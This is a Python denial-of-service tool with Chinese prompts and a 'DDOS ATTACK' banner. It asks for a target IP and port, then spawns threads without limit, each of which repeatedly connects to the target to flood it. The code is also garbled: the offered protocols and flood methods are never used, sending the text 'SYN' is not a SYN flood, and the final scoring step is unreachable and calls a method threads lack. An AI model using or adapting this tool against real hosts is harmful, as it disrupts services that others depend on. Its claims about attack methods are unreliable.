import socket
import threading
from rich import print

ddos = """
██████╗ ██████╗  ██████╗ ███████╗    █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗
██╔══██╗██╔══██╗██╔═══██╗██╔════╝    ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝
██║  ██║██║  ██║██║   ██║███████╗    ███████║   ██║      ██║   ███████║██║     █████╔╝ 
██║  ██║██║  ██║██║   ██║╚════██║    ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗ 
██████╔╝██████╔╝╚██████╔╝███████║    ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗
╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝    ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
"""

print(f'[yellow]{ddos}[/yellow]')

class DDoSAttack:
    def __init__(self, ip, port, attack_type, method, delay):
        self.ip = ip
        self.port = port
        self.attack_type = attack_type
        self.method = method
        self.delay = delay
        self.count = 0
        self.lock = threading.Lock()

    def run(self):
        while True:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(self.delay / 1000)
                sock.connect((self.ip, self.port))
                sock.send(b"SYN")
                sock.close()
                with self.lock:
                    self.count += 1
                print(f"攻击成功 {self.count}")
            except socket.timeout:
                pass
            except Exception as e:
                print(f"攻击失败: {e}")
                break

    def score(self):
        # 评估攻击效果
        return self.count

def main():
    print("请输入目标 IP 地址：")
    ip = input()
    print("请输入目标端口号：")
    port = int(input())
    print("请选择攻击协议类型：")
    print("  tcp")
    print("  udp")
    print("  icmp")
    attack_type = input()
    print("请选择攻击方式：")
    print("  synflood")
    print("  ackflood")
    print("  pingflood")
    method = input()
    print("请输入攻击延迟 (单位：毫秒)：")
    delay = int(input())

    # 创建攻击对象
    attack = DDoSAttack(ip, port, attack_type, method, delay)

    # 启动攻击
    threads = []
    while True:
        thread = threading.Thread(target=attack.run)
        thread.start()
        threads.append(thread)

    # 等待所有线程完成
    for thread in threads:
        thread.join()

    # 评估攻击效果
    scores = []
    for thread in threads:
        scores.append(thread.score())

    # 找到最合适的攻击方式
    best_score = max(scores)
    best_attack = threads[scores.index(best_score)]

    # 开始攻击
    best_attack.run()

if __name__ == "__main__":
    main()
